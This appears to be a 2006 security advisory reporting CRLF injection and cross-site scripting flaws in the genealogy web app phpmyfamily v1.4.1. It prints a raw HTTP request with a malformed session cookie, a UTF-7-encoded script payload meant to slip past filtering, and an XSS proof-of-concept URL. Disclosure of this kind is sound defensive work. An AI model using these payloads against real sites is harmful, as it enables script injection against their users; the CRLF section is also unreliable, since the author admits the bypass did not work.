      HYSA-2006-007 h4cky0u.org Advisory 016

TITLE:
======

phpmyfamily v1.4.1 CRLF injection & XSS


SEVERITY:
=========

Medium


SOFTWARE:
=========

phpmyfamily v1.4.1

http://www.phpmyfamily.net/


INFO:
=====

phpmyfamily is a dynamic genealogy website builder which allows geographically dispersed family members to maintain a central 

database of research which is readily accessable and editable.


DESCRIPTION:
============

--== CRLF Injection ==--

GET /phpmyfamily/ HTTP/1.0
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)
Host: 127.0.0.1:80
Cookie: PHPSESSID=-4-2-=674sdasaf_
Connection: Close

Warning: session_start() [function.session-start]: The session id contains illegal characters, valid characters are a-z, A-Z, 

0-9 and '-,' in C:\AppServ\www\phpmyfamily\inc\config.inc.php on line 88

You can try to encode <script>alert('matrix_killer');</script> in Utf-7 like this:

+ADw-+AHM-+AGM-+AHI-+AGk-+AHA-+AHQ-+AD4- alert('matrix_killer'); +ADw-/+AHM-+AGM-+AHI-+AGk-+AHA-+AHQ-+AD4- 

This way you can bypass the protection, but I'm not sure that it will work. For me it didn't but I'm still a beginner with 

the crlf attacks.

--== XSS ==--

http://127.0.0.1/phpmyfamily/track.php?person=00001&name='><script>alert();</script>&email=1&action=sub&submit=Wy%B6lij
